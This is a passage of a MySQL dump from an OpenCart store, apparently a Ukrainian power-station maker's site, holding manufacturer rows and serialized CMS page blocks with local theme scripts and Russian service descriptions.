UNLOCK TABLES;

LOCK TABLES `oc_length_class_description` WRITE;
/*!40000 ALTER TABLE `oc_length_class_description` DISABLE KEYS */;
INSERT INTO `oc_length_class_description` VALUES (1,1,'Сантиметр','см'),(2,1,'Миллиметр','мм'),(2,4,'Миллиметр','мм'),(1,4,'Сантиметр','см'),(1,3,'Сантиметр','см'),(2,3,'Миллиметр','мм');
/*!40000 ALTER TABLE `oc_length_class_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_location` WRITE;
/*!40000 ALTER TABLE `oc_location` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_location` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_manufacturer` WRITE;
/*!40000 ALTER TABLE `oc_manufacturer` DISABLE KEYS */;
INSERT INTO `oc_manufacturer` VALUES (5,'HTC','catalog/demo/htc_logo.jpg',0),(6,'Palm','catalog/demo/palm_logo.jpg',0),(7,'Hewlett-Packard','catalog/demo/hp_logo.jpg',0),(8,'Apple','catalog/demo/apple_logo.jpg',0),(9,'Canon','catalog/demo/canon_logo.jpg',0),(10,'Sony','catalog/demo/sony_logo.jpg',0),(11,'Спец сервис','',0);
/*!40000 ALTER TABLE `oc_manufacturer` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_manufacturer_to_store` WRITE;
/*!40000 ALTER TABLE `oc_manufacturer_to_store` DISABLE KEYS */;
INSERT INTO `oc_manufacturer_to_store` VALUES (5,0),(6,0),(7,0),(8,0),(9,0),(10,0),(11,0);
/*!40000 ALTER TABLE `oc_manufacturer_to_store` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_marketing` WRITE;
/*!40000 ALTER TABLE `oc_marketing` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_marketing` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_modification` WRITE;
/*!40000 ALTER TABLE `oc_modification` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_modification` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_module` WRITE;
/*!40000 ALTER TABLE `oc_module` DISABLE KEYS */;
INSERT INTO `oc_module` VALUES (30,'Category','banner','a:5:{s:4:\"name\";s:17:\"Banner - Category\";s:9:\"banner_id\";s:1:\"6\";s:5:\"width\";s:3:\"300\";s:6:\"height\";s:3:\"300\";s:6:\"status\";s:1:\"1\";}'),(29,'Home Page','carousel','a:5:{s:4:\"name\";s:20:\"Carousel - Home Page\";s:9:\"banner_id\";s:1:\"8\";s:5:\"width\";s:3:\"130\";s:6:\"height\";s:3:\"100\";s:6:\"status\";s:1:\"1\";}'),(28,'Home Page','featured','a:6:{s:4:\"name\";s:20:\"Featured - Home Page\";s:7:\"product\";a:4:{i:0;s:2:\"43\";i:1;s:2:\"40\";i:2;s:2:\"42\";i:3;s:2:\"30\";}s:5:\"limit\";s:1:\"4\";s:5:\"width\";s:3:\"200\";s:6:\"height\";s:3:\"200\";s:6:\"status\";s:1:\"1\";}'),(27,'Slideshow - Home Page','slideshow','a:5:{s:4:\"name\";s:21:\"Slideshow - Home Page\";s:9:\"banner_id\";s:1:\"7\";s:5:\"width\";s:4:\"1140\";s:6:\"height\";s:3:\"380\";s:6:\"status\";s:1:\"1\";}'),(31,'Слайдшоу','slideshow','a:5:{s:4:\"name\";s:16:\"Слайдшоу\";s:9:\"banner_id\";s:1:\"6\";s:5:\"width\";s:3:\"100\";s:6:\"height\";s:3:\"200\";s:6:\"status\";s:1:\"1\";}'),(34,'Заглавное фото 1','block','a:5:{s:4:\"name\";s:29:\"Заглавное фото 1\";s:6:\"status\";s:1:\"1\";s:4:\"head\";s:969:\"&lt;link href=&quot;../catalog/view/theme/service/stylesheet/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/swiper.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/stylesheet.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/adaptiveness.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/jquery-2.2.1.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/swiper.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/bootstrap.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/scripts.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\";s:4:\"code\";s:431:\"&lt;section class=&quot;motivation-image&quot;&gt;\r\n			{{&lt;img src=&quot;../image/main-image.jpg&quot; alt=&quot;&quot;&gt;|img}}\r\n			&lt;div class=&quot;wide-body-layout&quot;&gt;\r\n				&lt;div class=&quot;motivation-text&quot;&gt;\r\n					&lt;div class=&quot;main-text&quot;&gt;{{ДАРИМ СВЕТ}}&lt;/div&gt;\r\n					&lt;small&gt;{{КОГДА ЕГО НЕТ}}&lt;/small&gt;\r\n				&lt;/div&gt;\r\n			&lt;/div&gt;\r\n		&lt;/section&gt;\";s:6:\"fields\";a:3:{i:1;a:3:{s:23:\"../image/main-image.jpg\";a:6:{s:5:\"value\";s:22:\"catalog/main-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:19:\"ДАРИМ СВЕТ\";a:2:{s:5:\"value\";s:19:\"ДАРИМ СВЕТ\";s:4:\"type\";s:9:\"undefined\";}s:24:\"КОГДА ЕГО НЕТ\";a:2:{s:5:\"value\";s:24:\"КОГДА ЕГО НЕТ\";s:4:\"type\";s:9:\"undefined\";}}i:3;a:3:{s:23:\"../image/main-image.jpg\";a:6:{s:5:\"value\";s:23:\"../image/main-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:19:\"ДАРИМ СВЕТ\";a:2:{s:5:\"value\";s:19:\"ДАРИМ СВЕТ\";s:4:\"type\";s:9:\"undefined\";}s:24:\"КОГДА ЕГО НЕТ\";a:2:{s:5:\"value\";s:24:\"КОГДА ЕГО НЕТ\";s:4:\"type\";s:9:\"undefined\";}}i:4;a:3:{s:23:\"../image/main-image.jpg\";a:6:{s:5:\"value\";s:23:\"../image/main-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:19:\"ДАРИМ СВЕТ\";a:2:{s:5:\"value\";s:19:\"ДАРИМ СВЕТ\";s:4:\"type\";s:9:\"undefined\";}s:24:\"КОГДА ЕГО НЕТ\";a:2:{s:5:\"value\";s:24:\"КОГДА ЕГО НЕТ\";s:4:\"type\";s:9:\"undefined\";}}}}'),(33,'Что мы делаем?','block','a:5:{s:4:\"name\";s:25:\"Что мы делаем?\";s:6:\"status\";s:1:\"1\";s:4:\"head\";s:969:\"&lt;link href=&quot;../catalog/view/theme/service/stylesheet/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/swiper.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/stylesheet.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/adaptiveness.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/jquery-2.2.1.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/swiper.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/bootstrap.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/scripts.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\";s:4:\"code\";s:1932:\"&lt;section class=&quot;what-we-deal-with&quot;&gt;\r\n				&lt;div class=&quot;wide-body-layout&quot;&gt;\r\n					&lt;h2 class=&quot;section-title&quot;&gt;{{Что мы делаем?}}&lt;/h2&gt;\r\n					&lt;div class=&quot;flex-wrapper&quot;&gt;\r\n						&lt;div class=&quot;deal-item borders borders-no-hover flex-item&quot;&gt;\r\n							&lt;figure &gt;{{&lt;img src=&quot;../image/what-we-deal-with-1.jpg&quot; alt=&quot;&quot;&gt;|img}}&lt;/figure&gt;\r\n							&lt;figcapture&gt;{{Изготовление и продажа дизельных электростанций}}&lt;/figcapture&gt;\r\n						&lt;/div&gt;\r\n						&lt;div class=&quot;borders borders-no-hover flex-item&quot;&gt;\r\n							&lt;figure&gt;{{&lt;img src=&quot;../image/what-we-deal-with-2.jpg&quot; alt=&quot;&quot;&gt;|img}}&lt;/figure&gt;\r\n							&lt;figcapture&gt;{{Наладка энергосистем ракетных комплексов. Реализация и модернизация конверсионноай техники}}&lt;/figcapture&gt;\r\n						&lt;/div&gt;\r\n						&lt;div class=&quot;borders borders-no-hover flex-item&quot;&gt;\r\n							&lt;figure&gt;{{&lt;img src=&quot;../image/what-we-deal-with-3.jpg&quot; alt=&quot;&quot;&gt;|img}}&lt;/figure&gt;\r\n							&lt;figcapture&gt;{{Капительный ремонт и модернизация отечественных дизельных и газотурбинных электростанций}}&lt;/figcapture&gt;\r\n						&lt;/div&gt;\r\n						&lt;div class=&quot;borders borders-no-hover flex-item&quot;&gt;\r\n							&lt;figure&gt;{{&lt;img src=&quot;../image/what-we-deal-with-4.jpg&quot; alt=&quot;&quot;&gt;|img}}&lt;/figure&gt;\r\n							&lt;figcapture&gt;{{Изготовление, наладка и ремонт автоматизированных систем энергопитания}}&lt;/figcapture&gt;\r\n						&lt;/div&gt;\r\n					&lt;/div&gt;\r\n				&lt;/div&gt;\r\n			&lt;/section&gt;\";s:6:\"fields\";a:3:{i:1;a:9:{s:25:\"Что мы делаем?\";a:2:{s:5:\"value\";s:25:\"Что мы делаем?\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-1.jpg\";a:6:{s:5:\"value\";s:31:\"catalog/what-we-deal-with-1.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:90:\"Изготовление и продажа дизельных электростанций\";a:2:{s:5:\"value\";s:90:\"Изготовление и продажа дизельных электростанций\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-2.jpg\";a:6:{s:5:\"value\";s:31:\"catalog/what-we-deal-with-2.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:171:\"Наладка энергосистем ракетных комплексов. Реализация и модернизация конверсионноай техники\";a:2:{s:5:\"value\";s:171:\"Наладка энергосистем ракетных комплексов. Реализация и модернизация конверсионноай техники\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-3.jpg\";a:6:{s:5:\"value\";s:31:\"catalog/what-we-deal-with-1.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:168:\"Капительный ремонт и модернизация отечественных дизельных и газотурбинных электростанций\";a:2:{s:5:\"value\";s:168:\"Капительный ремонт и модернизация отечественных дизельных и газотурбинных электростанций\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-4.jpg\";a:6:{s:5:\"value\";s:31:\"catalog/what-we-deal-with-2.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:133:\"Изготовление, наладка и ремонт автоматизированных систем энергопитания\";a:2:{s:5:\"value\";s:133:\"Изготовление, наладка и ремонт автоматизированных систем энергопитания\";s:4:\"type\";s:9:\"undefined\";}}i:3;a:9:{s:25:\"Что мы делаем?\";a:2:{s:5:\"value\";s:25:\"Что мы делаем?\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-1.jpg\";a:6:{s:5:\"value\";s:32:\"../image/what-we-deal-with-1.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:90:\"Изготовление и продажа дизельных электростанций\";a:2:{s:5:\"value\";s:90:\"Изготовление и продажа дизельных электростанций\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-2.jpg\";a:6:{s:5:\"value\";s:32:\"../image/what-we-deal-with-2.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:171:\"Наладка энергосистем ракетных комплексов. Реализация и модернизация конверсионноай техники\";a:2:{s:5:\"value\";s:171:\"Наладка энергосистем ракетных комплексов. Реализация и модернизация конверсионноай техники\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-3.jpg\";a:6:{s:5:\"value\";s:32:\"../image/what-we-deal-with-3.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:168:\"Капительный ремонт и модернизация отечественных дизельных и газотурбинных электростанций\";a:2:{s:5:\"value\";s:168:\"Капительный ремонт и модернизация отечественных дизельных и газотурбинных электростанций\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-4.jpg\";a:6:{s:5:\"value\";s:32:\"../image/what-we-deal-with-4.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:133:\"Изготовление, наладка и ремонт автоматизированных систем энергопитания\";a:2:{s:5:\"value\";s:133:\"Изготовление, наладка и ремонт автоматизированных систем энергопитания\";s:4:\"type\";s:9:\"undefined\";}}i:4;a:9:{s:25:\"Что мы делаем?\";a:2:{s:5:\"value\";s:25:\"Что мы делаем?\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-1.jpg\";a:6:{s:5:\"value\";s:32:\"../image/what-we-deal-with-1.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:90:\"Изготовление и продажа дизельных электростанций\";a:2:{s:5:\"value\";s:90:\"Изготовление и продажа дизельных электростанций\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-2.jpg\";a:6:{s:5:\"value\";s:32:\"../image/what-we-deal-with-2.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:171:\"Наладка энергосистем ракетных комплексов. Реализация и модернизация конверсионноай техники\";a:2:{s:5:\"value\";s:171:\"Наладка энергосистем ракетных комплексов. Реализация и модернизация конверсионноай техники\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-3.jpg\";a:6:{s:5:\"value\";s:32:\"../image/what-we-deal-with-3.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:168:\"Капительный ремонт и модернизация отечественных дизельных и газотурбинных электростанций\";a:2:{s:5:\"value\";s:168:\"Капительный ремонт и модернизация отечественных дизельных и газотурбинных электростанций\";s:4:\"type\";s:9:\"undefined\";}s:32:\"../image/what-we-deal-with-4.jpg\";a:6:{s:5:\"value\";s:32:\"../image/what-we-deal-with-4.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:133:\"Изготовление, наладка и ремонт автоматизированных систем энергопитания\";a:2:{s:5:\"value\";s:133:\"Изготовление, наладка и ремонт автоматизированных систем энергопитания\";s:4:\"type\";s:9:\"undefined\";}}}}'),(35,'Сделано в Украине','block','a:5:{s:4:\"name\";s:32:\"Сделано в Украине\";s:6:\"status\";s:1:\"1\";s:4:\"head\";s:969:\"&lt;link href=&quot;../catalog/view/theme/service/stylesheet/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/swiper.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/stylesheet.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/adaptiveness.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/jquery-2.2.1.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/swiper.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/bootstrap.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/scripts.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\";s:4:\"code\";s:289:\"&lt;section class=&quot;made-in-ukraine&quot;&gt;\r\n				&lt;div class=&quot;wide-body-layout&quot;&gt;\r\n					&lt;h2 class=&quot;section-title&quot;&gt;{{made in ukraine}}&lt;/h2&gt;\r\n					&lt;p class=&quot;description&quot;&gt;{{Текст}}&lt;/p&gt;\r\n				&lt;/div&gt;\r\n			&lt;/section&gt;\";s:6:\"fields\";a:3:{i:1;a:2:{s:15:\"made in ukraine\";a:2:{s:5:\"value\";s:15:\"made in ukraine\";s:4:\"type\";s:9:\"undefined\";}s:10:\"Текст\";a:2:{s:5:\"value\";s:10:\"Текст\";s:4:\"type\";s:9:\"undefined\";}}i:3;a:2:{s:15:\"made in ukraine\";a:2:{s:5:\"value\";s:15:\"made in ukraine\";s:4:\"type\";s:9:\"undefined\";}s:10:\"Текст\";a:2:{s:5:\"value\";s:10:\"Текст\";s:4:\"type\";s:9:\"undefined\";}}i:4;a:2:{s:15:\"made in ukraine\";a:2:{s:5:\"value\";s:15:\"made in ukraine\";s:4:\"type\";s:9:\"undefined\";}s:10:\"Текст\";a:2:{s:5:\"value\";s:10:\"Текст\";s:4:\"type\";s:9:\"undefined\";}}}}'),(36,'Наш рабочий колектив','block','a:5:{s:4:\"name\";s:38:\"Наш рабочий колектив\";s:6:\"status\";s:1:\"1\";s:4:\"head\";s:969:\"&lt;link href=&quot;../catalog/view/theme/service/stylesheet/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/swiper.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/stylesheet.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/adaptiveness.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/jquery-2.2.1.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/swiper.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/bootstrap.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/scripts.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\";s:4:\"code\";s:781:\"&lt;section class=&quot;team&quot;&gt;\r\n				&lt;div class=&quot;wide-body-layout&quot;&gt;\r\n					&lt;h2 class=&quot;section-title&quot;&gt;{{Наш рабочий коллектив}}&lt;/h2&gt;\r\n					&lt;h3 class=&quot;section-subtitle&quot;&gt;{{Более 40 квалифицированных специалистов}}&lt;/h3&gt;\r\n					&lt;div class=&quot;flex-wrapper people&quot;&gt;\r\n						{{group name=&quot;team&quot;}}\r\n						&lt;div class=&quot;flex-item person&quot;&gt;\r\n							{{&lt;img src=&quot;../image/person-portrait.jpg&quot; alt=&quot;&quot; class=&quot;person-portrait&quot;&gt;|img}}\r\n							&lt;h5 class=&quot;person-name&quot;&gt;{{Слесари}}&lt;/h5&gt;\r\n						&lt;/div&gt;\r\n						{{/group}}\r\n					&lt;/div&gt;\r\n				&lt;/div&gt;\r\n			&lt;/section&gt;\";s:6:\"fields\";a:3:{i:1;a:3:{s:4:\"team\";a:3:{i:0;a:2:{s:28:\"../image/person-portrait.jpg\";a:6:{s:5:\"value\";s:34:\"catalog/team/person-portrait-2.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:14:\"Слесари\";a:2:{s:5:\"value\";s:14:\"Слесари\";s:4:\"type\";s:9:\"undefined\";}}i:1;a:2:{s:28:\"../image/person-portrait.jpg\";a:6:{s:5:\"value\";s:34:\"catalog/team/person-portrait-2.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:14:\"Слесари\";a:2:{s:5:\"value\";s:15:\"Слесари2\";s:4:\"type\";s:9:\"undefined\";}}i:2;a:2:{s:28:\"../image/person-portrait.jpg\";a:6:{s:5:\"value\";s:32:\"catalog/team/person-portrait.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:14:\"Слесари\";a:2:{s:5:\"value\";s:14:\"Слесари\";s:4:\"type\";s:9:\"undefined\";}}}s:40:\"Наш рабочий коллектив\";a:2:{s:5:\"value\";s:40:\"Наш рабочий коллектив\";s:4:\"type\";s:9:\"undefined\";}s:73:\"Более 40 квалифицированных специалистов\";a:2:{s:5:\"value\";s:73:\"Более 40 квалифицированных специалистов\";s:4:\"type\";s:9:\"undefined\";}}i:3;a:3:{s:4:\"team\";a:1:{i:0;a:2:{s:28:\"../image/person-portrait.jpg\";a:6:{s:5:\"value\";s:28:\"../image/person-portrait.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:14:\"Слесари\";a:2:{s:5:\"value\";s:14:\"Слесари\";s:4:\"type\";s:9:\"undefined\";}}}s:40:\"Наш рабочий коллектив\";a:2:{s:5:\"value\";s:40:\"Наш рабочий коллектив\";s:4:\"type\";s:9:\"undefined\";}s:73:\"Более 40 квалифицированных специалистов\";a:2:{s:5:\"value\";s:73:\"Более 40 квалифицированных специалистов\";s:4:\"type\";s:9:\"undefined\";}}i:4;a:3:{s:4:\"team\";a:1:{i:0;a:2:{s:28:\"../image/person-portrait.jpg\";a:6:{s:5:\"value\";s:28:\"../image/person-portrait.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:14:\"Слесари\";a:2:{s:5:\"value\";s:14:\"Слесари\";s:4:\"type\";s:9:\"undefined\";}}}s:40:\"Наш рабочий коллектив\";a:2:{s:5:\"value\";s:40:\"Наш рабочий коллектив\";s:4:\"type\";s:9:\"undefined\";}s:73:\"Более 40 квалифицированных специалистов\";a:2:{s:5:\"value\";s:73:\"Более 40 квалифицированных специалистов\";s:4:\"type\";s:9:\"undefined\";}}}}'),(37,'Гарантия и сервис','block','a:5:{s:4:\"name\";s:32:\"Гарантия и сервис\";s:6:\"status\";s:1:\"1\";s:4:\"head\";s:969:\"&lt;link href=&quot;../catalog/view/theme/service/stylesheet/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/swiper.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/stylesheet.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/adaptiveness.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/jquery-2.2.1.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/swiper.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/bootstrap.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/scripts.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\";s:4:\"code\";s:563:\"&lt;section class=&quot;warranty&quot;&gt;\r\n				&lt;div class=&quot;wide-body-layout&quot;&gt;\r\n					&lt;h2 class=&quot;section-title&quot;&gt;{{Гарантия и сервис}}&lt;/h2&gt;\r\n					&lt;h3 class=&quot;section-subtitle&quot;&gt;{{Бесплатный выезд специалистов в любую точку Украины}}&lt;/h3&gt;\r\n					{{&lt;img src=&quot;../image/warranty-image.jpg&quot; alt=&quot;&quot;&gt;|img}}\r\n					&lt;p class=&quot;section-description&quot;&gt;{{Описание}}&lt;/p&gt;\r\n				&lt;/div&gt;\r\n			&lt;/section&gt;\";s:6:\"fields\";a:3:{i:1;a:4:{s:32:\"Гарантия и сервис\";a:2:{s:5:\"value\";s:32:\"Гарантия и сервис\";s:4:\"type\";s:9:\"undefined\";}s:96:\"Бесплатный выезд специалистов в любую точку Украины\";a:2:{s:5:\"value\";s:96:\"Бесплатный выезд специалистов в любую точку Украины\";s:4:\"type\";s:9:\"undefined\";}s:27:\"../image/warranty-image.jpg\";a:6:{s:5:\"value\";s:26:\"catalog/warranty-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:16:\"Описание\";a:2:{s:5:\"value\";s:16:\"Описание\";s:4:\"type\";s:9:\"undefined\";}}i:3;a:4:{s:32:\"Гарантия и сервис\";a:2:{s:5:\"value\";s:32:\"Гарантия и сервис\";s:4:\"type\";s:9:\"undefined\";}s:96:\"Бесплатный выезд специалистов в любую точку Украины\";a:2:{s:5:\"value\";s:96:\"Бесплатный выезд специалистов в любую точку Украины\";s:4:\"type\";s:9:\"undefined\";}s:27:\"../image/warranty-image.jpg\";a:6:{s:5:\"value\";s:27:\"../image/warranty-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:16:\"Описание\";a:2:{s:5:\"value\";s:16:\"Описание\";s:4:\"type\";s:9:\"undefined\";}}i:4;a:4:{s:32:\"Гарантия и сервис\";a:2:{s:5:\"value\";s:32:\"Гарантия и сервис\";s:4:\"type\";s:9:\"undefined\";}s:96:\"Бесплатный выезд специалистов в любую точку Украины\";a:2:{s:5:\"value\";s:96:\"Бесплатный выезд специалистов в любую точку Украины\";s:4:\"type\";s:9:\"undefined\";}s:27:\"../image/warranty-image.jpg\";a:6:{s:5:\"value\";s:27:\"../image/warranty-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:16:\"Описание\";a:2:{s:5:\"value\";s:16:\"Описание\";s:4:\"type\";s:9:\"undefined\";}}}}'),(38,'Наши цеха','block','a:5:{s:4:\"name\";s:17:\"Наши цеха\";s:6:\"status\";s:1:\"1\";s:4:\"head\";s:970:\"&lt;link href=&quot;../catalog/view/theme/service/stylesheet/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/swiper.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/stylesheet.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/adaptiveness.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/jquery-2.2.1.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script 